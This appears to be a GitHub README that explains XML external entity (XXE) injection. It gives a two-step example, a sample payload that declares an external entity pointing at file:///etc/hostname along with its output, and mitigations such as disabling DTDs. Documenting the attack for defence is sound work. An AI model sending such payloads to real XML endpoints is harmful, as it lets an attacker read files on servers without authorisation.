<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/xxe-injection/main/xxe-injection.png"></p>

A threat actor may interfere with an application's processing of extensible markup language (XML) data to view the content of a target's files

## Example #1
1. Threat actor sends a vulnerable target a malicious request that contains a reference to an external entity (a system identifier)
2. The target's XML processor replaces the external entity with the content dereferenced by the system identifier 

## Code
#### Target-in
```
<?xml version="1.0" encoding="UTF-8"?>
<getLastName>John01</getLastName>
```

#### Target-Out
```
Jone Doe
```

#### Target-in
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE malicious [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<getInfo>&xxe;</getInfo>
```

#### Target-Out
```
usystem01
```

## Impact
High

## Names
- XXE injection
- XEE injection
- XML injection

## Risk
- Read data

## Redemption
- Secure processing
- Disable DTD and XML external entity

## ID
4b3566ce-3f7f-40d8-b882-09f59ca967b8

## References
- [wiki](https://en.wikipedia.org/wiki/XML_external_entity_attack)
